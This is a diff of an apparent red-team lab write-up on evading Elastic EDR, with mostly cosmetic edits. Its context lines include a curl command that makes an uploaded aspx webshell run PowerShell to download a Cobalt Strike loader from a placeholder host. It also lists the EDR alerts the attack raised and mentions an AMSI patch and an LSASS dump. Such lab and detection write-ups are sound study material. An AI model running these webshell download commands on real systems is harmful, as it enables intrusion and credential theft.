@@ -11,7 +11,7 @@ On one of the application, we successfully uploaded a aspx webshell which execut
 
 ## Web RCE
 
-We downloaded our CobaltStrike loader and executed it
+We downloaded our Cobalt Strike loader and executed it
 
 ```bash
 > curl http://website.crash.lab/webshell.aspx --data '70c1cc863a=powershell wget http://xxxx.com/load.exe -outfile C:\Windows\Temp\load.exe'
@@ -27,8 +27,8 @@ If we look at the alerts in Elastic EDR, we can see that we were very noisy.
 ![](/assets/posts/2024-01-04-increase-stealth-capabilities-part1/initial-alerts.png)
 
 
-- `Web Shell Detection: Script Process Child of Common Web Processes` because the IIS process w3wp.exe spawned `cmd.exe`
-- `Malicious Behavior Detection Alert: Suspicious Microsoft IIS Worker Descendant` because the IIS process w3wp.exe spawned cmd.exe that suggest the web server has been compromised
+- `Web Shell Detection: Script Process Child of Common Web Processes` because the IIS process `w3wp.exe` spawned `cmd.exe`
+- `Malicious Behavior Detection Alert: Suspicious Microsoft IIS Worker Descendant` because the IIS process `w3wp.exe` spawned `cmd.exe` that suggest the web server has been compromised
 - `Remote File Download via PowerShell` because of the `wget` Powershell command to download our loader
 - `Memory Threat Detection Alert: Windows.Trojan.CobaltStrike` because Elastic EDR Yara rules flagged our beacon in memory
 - `Malicious Behavior Detection Alert: Network Module Loaded from Suspicious Unbacked Memory` - as our beacon is stored in unbacked memory, Elastic EDR caught an API call that came from this suspicious region
@@ -57,7 +57,7 @@ And we got our SYSTEM beacon back.
 The last action raised the following alerts:
 
 - `Malicious Behavior Detection Alert: Microsoft Common Language Runtime Loaded from Suspicious Memory` - because CLR.dll has been loaded by the post-exploit temporary process
-- `Malicious Behavior Detection Alert: AMSI or WLDP Bypass via Memory Patching` - the CobaltStrike AMSI patch has been flagged
+- `Malicious Behavior Detection Alert: AMSI or WLDP Bypass via Memory Patching` - the Cobalt Strike AMSI patch has been flagged
 
 
 ## LSASS dump
